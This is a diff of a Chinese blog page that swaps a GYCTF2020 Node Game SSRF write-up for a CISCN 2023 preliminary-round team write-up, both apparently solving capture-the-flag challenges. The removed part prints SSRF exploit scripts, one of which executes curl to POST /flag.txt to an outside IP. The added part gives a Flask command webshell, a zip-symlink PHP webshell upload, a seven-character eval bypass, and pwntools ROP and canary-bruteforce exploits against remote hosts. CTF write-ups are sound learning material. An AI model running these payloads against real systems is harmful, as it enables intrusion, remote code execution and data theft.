@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>GYCTF2020 Node Game | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 ">
-  <meta name="description" content="GYCTF2020 Node Game | 甜筒园">
+  <title>第16届ciscn初赛wp | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="第16届ciscn初赛wp | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="一、战队信息战队名称： 508 战队排名： 175 二、解题情况 三、解题过程MISC被加密的生产流量 点击一段TCP流量右键追踪TCP流  发现一些字符，猜测是base32,解密后得到flag flag&amp;#123;c1f_fi1g_1000&amp;#125;  pyshellnc连上靶机后，FUZZ一波发现一次最多只能用7个字符，并且不可以使用&#x3D;号，不过我们可以利用_的特性进行字符串拼接得到： ope">
 <meta property="og:type" content="article">
@@ -602,9 +602,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-GYCTF2020-Node-Game" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-508战队WRITEUP" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">GYCTF2020 Node Game</h1>
+        <h1 class="article-title">第16届ciscn初赛wp</h1>
     
     <div class="article-meta">
         
@@ -614,27 +614,20 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Writeup">Writeup</a>
+            <a  data-rel="writeup">writeup</a>
             
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-07-29 17:12:48'>2023-05-28 18:51</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-24 19:01:30'>2023-03-21 16:21</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:1.1k</span>
+        <span>Count:1.3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -664,7 +657,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">一、战队信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="toc-text">二、解题情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-text">三、解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F"><span class="toc-text">被加密的生产流量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pyshell"><span class="toc-text">pyshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E5%8D%A1"><span class="toc-text">签到卡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91"><span class="toc-text">基于国密SM2算法的密钥密文分发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sign-in-passwd"><span class="toc-text">Sign_in_passwd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#go-session"><span class="toc-text">go_session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unzip"><span class="toc-text">unzip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dumpit"><span class="toc-text">dumpit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE"><span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#babyRE"><span class="toc-text">babyRE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="toc-text">烧烤摊儿</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#funcanary"><span class="toc-text">funcanary</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -680,226 +673,187 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目环境读取源码：</p>
-<p>dd题目源码：</p>
-<pre><code class="javascript">
-var express = require(&#39;express&#39;);
-var app = express();
-var fs = require(&#39;fs&#39;);
-var path = require(&#39;path&#39;);
-var http = require(&#39;http&#39;);
-var pug = require(&#39;pug&#39;);
-var morgan = require(&#39;morgan&#39;);
-const multer = require(&#39;multer&#39;);
-
-
-app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;));
-app.use(morgan(&#39;short&#39;));
-app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#39;/uploads&#39;)))
-app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#39;/template&#39;)))
-
-
-app.get(&#39;/&#39;, function(req, res) &#123;
-    var action = req.query.action?req.query.action:&quot;index&quot;;
-    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) )&#123;
-        res.send(&quot;Errrrr, You have been Blocked&quot;);
+        <h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称： 508</p>
+<p>战队排名： 175</p>
+<h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528170826181.png" alt="image-20230528170826181"></p>
+<h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h4><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20230528084837.png" alt="QQ截图20230528084837"></p>
+<p>点击一段TCP流量右键追踪TCP流</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20230528084556.png" alt="QQ截图20230528084556"></p>
+<p>发现一些字符，猜测是base32,解密后得到flag</p>
+<pre><code class="flag">flag&#123;c1f_fi1g_1000&#125;
+</code></pre>
+<h4 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h4><p>nc连上靶机后，FUZZ一波发现一次最多只能用7个字符，并且不可以使用<code>=</code>号，不过我们可以利用<code>_</code>的特性进行字符串拼接得到：</p>
+<pre><code class="payload">open(&quot;/flag&quot;).read()
+</code></pre>
+<p>然后<code>eval</code>执行命令得到flag。由于只能用七个字符，需要分段输入：</p>
+<pre><code class="poc">&#39;open(&#39;
+_+&#39;&quot;/f&#39;
+_+&#39;lag&#39;
+_+&#39;&quot;).&#39;
+_+&#39;rea&#39;
+_+&#39;d()&#39;
+eval(_)
+</code></pre>
+<p>得到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528172114548.png" alt="image-20230528172114548"></p>
+<pre><code class="flag">flag&#123;dc1b706a-eec2-40bc-ae16-a14dc56f43e1&#125;
+</code></pre>
+<h4 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h4><p>关注一下公众号<br>提示<code>print(open(&#39;/etc/passwd&#39;).read())</code></p>
+<p>直接读<code>/flag</code></p>
+<pre><code>print(open(&#39;/flag&#39;).read())
+</code></pre>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发"></a>基于国密SM2算法的密钥密文分发</h4><p>按照题目文档所给内容，按步骤执行下列命令：</p>
+<pre><code>curl -d &quot;name=&amp;school=&amp;phone=&quot; http://192.168.
+31.153:3000/api/login 
+curl -d &quot;id=&amp;publicKey=&quot; http://192.168.
+31.153:3000/api/allkey
+curl -d &quot;id=&quot; http://192.168.
+31.153:3000/api/quantum
+</code></pre>
+<p>获得id,找一个网站生成一个SM2的publickey和privatekey,再执行下一个命令：</p>
+<p><img src="C:\Users\tty\AppData\Roaming\Typora\typora-user-images\image-20230528173902748.png" alt="image-20230528173902748"></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528174630632.png" alt="image-20230528174630632"></p>
+<p>获得公钥B_Public_Key明文、私钥B_Private_Key密文、随机数C密文，用SM2算法解出随机数C</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528175518894.png" alt="image-20230528175518894"></p>
+<p>用SM4-ECB解密B_Private_Key密文：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528172827249.png" alt="image-20230528172827249"></p>
+<p>用SM2解密密钥D获得明文后进行验证，成功后访问<code>/api/search</code>获得flag：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528172614369.png" alt="image-20230528172614369"></p>
+<h4 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h4><p>附件内容</p>
+<pre><code>j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D
+GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5
+</code></pre>
+<p>自定义base</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230528171906.png" alt="20230528172139"></p>
+<p>下面一串字符是字母表，urldecode一下</p>
+<pre><code>GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230528172139.png" alt="20230528172139"></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h4><p>拿到源码后，本地启动一个go服务，修改源码生成admin的cookie:</p>
+<pre><code class="go">func Index(c *gin.Context) &#123;
+    session, err := store.Get(c.Request, &quot;session-name&quot;)
+    if err != nil &#123;
+        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+        return
     &#125;
-    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);
-    var html = pug.renderFile(file);
-    res.send(html);
-&#125;);
-
-app.post(&#39;/file_upload&#39;, function(req, res)&#123;
-    var ip = req.connection.remoteAddress;
-    var obj = &#123;
-        msg: &#39;&#39;,
-    &#125;
-    if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;
-        obj.msg=&quot;only admin&#39;s ip can use it&quot;
-        res.send(JSON.stringify(obj));
-        return 
-    &#125;
-    fs.readFile(req.files[0].path, function(err, data)&#123;
-        if(err)&#123;
-            obj.msg = &#39;upload failed&#39;;
-            res.send(JSON.stringify(obj));
-        &#125;else&#123;
-            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;
-            var file_name = req.files[0].originalname
-            var dir_file = __dirname + file_path + file_name
-            if(!fs.existsSync(__dirname + file_path))&#123;
-                try &#123;
-                    fs.mkdirSync(__dirname + file_path)
-                &#125; catch (error) &#123;
-                    obj.msg = &quot;file type error&quot;;
-                    res.send(JSON.stringify(obj));
-                    return
-                &#125;
-            &#125;
-            try &#123;
-                fs.writeFileSync(dir_file,data)
-                obj = &#123;
-                    msg: &#39;upload success&#39;,
-                    filename: file_path + file_name
-                &#125; 
-            &#125; catch (error) &#123;
-                obj.msg = &#39;upload failed&#39;;
-            &#125;
-            res.send(JSON.stringify(obj));    
-        &#125;
-    &#125;)
-&#125;)
-
-app.get(&#39;/source&#39;, function(req, res) &#123;
-    res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;));
-&#125;);
-
-
-app.get(&#39;/core&#39;, function(req, res) &#123;
-    var q = req.query.q;
-    var resp = &quot;&quot;;
-    if (q) &#123;
-        var url = &#39;http://localhost:8081/source?&#39; + q
-        console.log(url)
-        var trigger = blacklist(url);
-        if (trigger === true) &#123;
-            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);
-        &#125; else &#123;
-            try &#123;
-                http.get(url, function(resp) &#123;
-                    resp.setEncoding(&#39;utf8&#39;);
-                    resp.on(&#39;error&#39;, function(err) &#123;
-                    if (err.code === &quot;ECONNRESET&quot;) &#123;
-                     console.log(&quot;Timeout occurs&quot;);
-                     return;
-                    &#125;
-                   &#125;);
-
-                    resp.on(&#39;data&#39;, function(chunk) &#123;
-                        try &#123;
-                         resps = chunk.toString();
-                         res.send(resps);
-                        &#125;catch (e) &#123;
-                           res.send(e.message);
-                        &#125;
- 
-                    &#125;).on(&#39;error&#39;, (e) =&gt; &#123;
-                         res.send(e.message);&#125;);
-                &#125;);
-            &#125; catch (error) &#123;
-                console.log(error);
-            &#125;
-        &#125;
-    &#125; else &#123;
-        res.send(&quot;search param &#39;q&#39; missing!&quot;);
-    &#125;
-&#125;)
-
-function blacklist(url) &#123;
-    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;];
-    var arrayLen = evilwords.length;
-    for (var i = 0; i &lt; arrayLen; i++) &#123;
-        const trigger = url.includes(evilwords[i]);
-        if (trigger === true) &#123;
-            return true
+    if session.Values[&quot;name&quot;] == nil &#123;
+        session.Values[&quot;name&quot;] = &quot;admin&quot;
+        err = session.Save(c.Request, c.Writer)
+        if err != nil &#123;
+            http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+            return
         &#125;
     &#125;
+
+    c.String(200, &quot;Hello, guest&quot;)
 &#125;
-
-var server = app.listen(8081, function() &#123;
-    var host = server.address().address
-    var port = server.address().port
-    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)
-&#125;)
 </code></pre>
-<p>文件上传部分要求只能本地上传，想到SSRF漏洞。</p>
-<p>题目也特别强调了 Node 版本为 8.12.0，那么就在网上一搜，发现这个版本的 Node 的 http 模块这里果然有漏洞。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p>
-<p>参考了各位师傅的wp也是一知半解，这里贴出来两种脚本供参考</p>
-<pre><code class="python">import urllib.parse
-import requests
+<p>将生成的cookie放到靶机上访问进行模板注入</p>
+<p>利用context中的方法进行文件上传保存到远程，由于靶机存在debug的flask服务，从flask服务的报错中可以发现其文件为<code>sever.py</code>,因此尝试覆盖掉<code>sever.py</code>写入webshell</p>
+<pre><code class="python">from flask import Flask, request
+import os
 
-payload = &#39;&#39;&#39; HTTP/1.1
-Host: x
-Connection: keep-alive
+app = Flask(__name__)
 
-POST /file_upload HTTP/1.1
-Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
-Connection: keep-alive
-cache-control: no-cache
-Host: x
-Content-Length: 294
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
+def root():
+    s=os.popen(request.args[&quot;s&quot;]).read()
+    return s
 
-----------------------------919695033422425209299810
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ttycp3.pug&quot;
-Content-Type: /../template
-
-doctype html
-html
-  head
-    style
-      include ../../../../../../../flag.txt
-
-----------------------------919695033422425209299810--
-
-GET /flag HTTP/1.1
-Host: x
-Connection: close
-x:&#39;&#39;&#39;
-payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)
-payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
-# print(payload)
-r = requests.get(&#39;http://2174017e-6eab-4709-a9cd-7c63651b7684.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))
-print(r.text)
-#	最后访问?action=ttycp3获得flag
+app.run(&quot;0.0.0.0&quot;, debug=True)
 </code></pre>
-<p>反弹shell版本：</p>
-<pre><code class="python">import urllib.parse
-import requests
-
-payload = &quot;&quot;&quot;
-
-POST /file_upload HTTP/1.1
-Host: localhost:8081
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=---------------------------79799747022511107691492167111
-Content-Length:1000
-Origin: http://localhost:8081
-Connection: close
-Referer: http://localhost:8081/?action=upload
-Upgrade-Insecure-Requests: 1
-
------------------------------79799747022511107691492167111
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
-Content-Type: ../template
-
-- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl 82.157.69.84:12345 -X POST -d `cat /flag.txt`&#39;)
------------------------------79799747022511107691492167111--
-
-
-&quot;&quot;&quot;.replace(&quot;\n&quot;, &quot;\r\n&quot;)
-
-
-def payload_encode(raw):
-    ret = u&quot;&quot;
-    for i in raw:
-        ret += chr(0x0100 + ord(i))  # 替换为高编码unicode字符
-    return ret
-
-
-payload = payload_encode(payload)
-print(payload)
-
-r = requests.get(&#39;http://5f09d3d5-09ee-4742-a142-40df87c9ccf5.node4.buuoj.cn:81/core?q=&#39; + urllib.parse.quote(payload))
-print(r.text)
-r = requests.get(&#39;http://5f09d3d5-09ee-4742-a142-40df87c9ccf5.node4.buuoj.cn:81/?action=shell&#39;)
+<p>用postman进行模板注入同时上传文件</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528182304680.png" alt="image-20230528182304680"></p>
+<p>可以发现保存成功，访问flask服务进行任意代码执行</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528182434450.png" alt="image-20230528182434450"></p>
+<h4 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h4><p>在vps上进入<code>/tmp</code>目录后，建立一个软链接</p>
+<pre><code>ln -s /var/www/html
 </code></pre>
-<p>在自己服务器上开监听即可</p>
-<hr>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://y4tacker.gitee.io/2021/01/28/year/2021/1%E6%9C%88/GYCTF2020-NodeGame/">GYCTF2020-NodeGame</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/129000051">[GYCTF2020]Node Game</a></p>
+<p>进入html目录后，新建一个文件<code>1.php</code>写入一句话木马:</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528183702314.png" alt="image-20230528183702314"></p>
+<p>将软链接压缩成html.zip,将html目录压缩成shell.zip:</p>
+<pre><code>zip  --symlink html.zip  ./html 
+zip  shell.zip ./html/1.php
+</code></pre>
+<p>依次上传html.zip和shell.zip后，访问1.php进行getshell</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528184433066.png" alt="image-20230528184433066"></p>
+<h4 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h4><p>构造报错获得当前目录</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528184813964.png" alt="image-20230528184813964"></p>
+<p>通过测试发现db处可以进行命令注入，尝试进行文件写入，发现可以利用错误输出重定向对报错进行写出到文件，经过本地测试发现数据库名会完整的出现在报错中。因此构造数据库名为恶意代码尝试写入webshell：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528185743729.png" alt="image-20230528185743729"></p>
+<p>访问err.php，在phpinfo()中找到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528185830448.png" alt="image-20230528185830448"></p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h4><p>题目附件给了一个xml文件，通过观察xml头发现一个网站<a href="https://snap.berkeley.edu，在该网站上导入xml文件后观察关键代码：">https://snap.berkeley.edu，在该网站上导入xml文件后观察关键代码：</a></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528190452960.png" alt="image-20230528190452960"></p>
+<p>发现secret的生成方式为flag的每一位异或flag前一位，点击secret获得secret的列表</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528190404336.png" alt="image-20230528190404336"></p>
+<p>根据上述逻辑逆向构造python脚本异或获得答案</p>
+<pre><code class="python">prime=[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]
+flag=&#39;f&#39;
+for i in range(1,len(prime)):
+    flag += chr(prime[i]^ord(flag[i-1]))
+print(flag)
+</code></pre>
+<pre><code>flag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;
+</code></pre>
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h4><p>输入-10000进入vip函数使own&#x3D;1，进入gaiming栈溢出获取权限</p>
+<pre><code class="python">from pwn import *
+from LibcSearcher import * 
+p=remote(&quot;47.94.206.10&quot;,42598)
+p.sendlineafter(&#39;&gt;&#39;,&#39;1&#39;)
+p.sendline(&#39;1&#39;)
+p.sendline(&#39;-1000000&#39;)
+p.sendlineafter(&#39;&gt;&#39;,&#39;4&#39;)
+p.sendlineafter(&#39;&gt;&#39;,&#39;5&#39;)
+
+sys=0x4230a6
+data=0x4e60f0
+rax=0x458827
+rdi=0x40264f
+rsi=0x40264d
+rdx=0x4a404b
+
+
+payload=&#39;/bin/sh\x00&#39;+&#39;a&#39;*0x20
+payload+=p64(rdi)
+payload+=p64(data)
+payload+=p64(rsi)+p64(0)+p64(0)
+payload+=p64(rdx)+p64(0)+p64(0)
+payload+=p64(rax)+p64(59)+p64(sys)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230528191335942.png" alt="image-20230528191335942"></p>
+<h4 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h4><p>爆破canary+跳转后门函数+爆破1位pie</p>
+<pre><code class="python">from pwn import *
+
+#p = process(&quot;./funcanary&quot;)
+p=remote(&quot;123.56.135.185&quot;, 37438)
+context.log_level = &quot;debug&quot;
+canary = &quot;\x00&quot;
+
+count = 0;
+while(1):
+    for i in range(256):
+        p.recvline()
+        log.info(&quot;num: &quot; + hex(count) + &quot;     byte: &quot; + hex(i))
+        p.send(&#39;a&#39;*0x68 + canary + chr(i))
+        a=p.recvline()
+        if &quot;fun&quot; in a:
+                count += 1
+                canary += chr(i)
+                break
+    if count == 7:
+    break
+
+for i in range(16):
+    payload = &quot;a&quot;*0x68 + canary + p64(0)+p8(0x31) + p8((i*0x10) + 2)
+    log.info(hex((i*0x10) + 2))
+    p.send(payload)
+    a = p.recvuntil(&quot;welcome\n&quot;)
+    if &quot;flag&quot; in a:
+        pause()
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
